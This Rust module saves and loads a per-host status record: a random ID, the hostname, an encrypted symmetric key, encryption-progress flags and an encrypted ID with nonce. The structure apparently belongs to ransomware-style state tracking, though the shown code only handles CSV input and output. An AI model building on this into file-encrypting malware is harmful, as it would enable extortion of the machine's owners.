use std::{
    fs::File,
    path::PathBuf
};
use csv::{ReaderBuilder, WriterBuilder};
use rand::{Rng, SeedableRng, rngs::StdRng, distributions::Alphanumeric};
use serde::{Serialize, Deserialize};
use log::{debug, error, info};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct Status {
    pub id: String,
    pub hostname: String,
    pub asymmetrically_encrypted_symmetric_key: String,
    pub encryption_started: bool,
    pub encryption_complete: bool,
    pub symmetrically_encrypted_id: String,
    pub symmetrically_encrypted_id_nonce: String
}

pub const STATUS_FILENAME: &str = "status.csv";

pub fn import_status_csv(path: &PathBuf) -> Option<Status> {
    let file = match File::open(path.join(STATUS_FILENAME)) {
        Ok(file_result) => {
            info!("Existing CSV file found: {:?}", file_result);
            file_result
        },
        Err(file_result) => {
            info!("Existing CSV file not found: {}", file_result);
            return None;
        },
    };
    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
    let row = match reader.deserialize().nth(0) {
        Some(row_result) => {
            debug!("Parsing first row: {:?}", row_result);
            row_result
        },
        None => {
            error!("No first row to parse");
            return None;
        },
    };
    let status = match row {
        Ok(status_result) => {
            debug!("Successfuly parsed row to status: {:?}", status_result);
            status_result
        },
        Err(status_result) => {
            error!("Failed to parse row to status: {}", status_result);
            return None;
        },
    };  
    return Some(status);
}

pub fn export_status_csv(path: &PathBuf, status: &Status) {
    let file = File::create(path.join(STATUS_FILENAME)).expect("Error accessing filesystem to write status CSV");
    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);
    writer.serialize(status).expect("Failed to serialize status");    
    writer.flush().expect("Failed to flush status to file");
}

pub fn create_status() -> Status {
    let status = Status {
        id: get_id(),
        hostname: get_hostname(),
        asymmetrically_encrypted_symmetric_key: String::new(),
        encryption_started: false,
        encryption_complete: false,
        symmetrically_encrypted_id: String::new(),
        symmetrically_encrypted_id_nonce: String::new()
    };
    debug!("Created new status: {:?}", status);
    return status;
}

fn get_hostname() -> String {
    let hostname = match hostname::get() {
        Ok(hostname_result) => {
            debug!("Got hostname: {:?}", hostname_result);
            hostname_result.to_string_lossy().to_string()
        },
        Err(hostname_result) => {
            error!("Error getting hostname: {}", hostname_result);
            String::from("HostnameError")
        },
    };
    return hostname;
}

fn get_id() -> String {
    let rng = StdRng::from_entropy();
    let id = rng.sample_iter(&Alphanumeric).take(16).map(char::from).collect();
    debug!("Created new ID: {}", id);
    return id;
}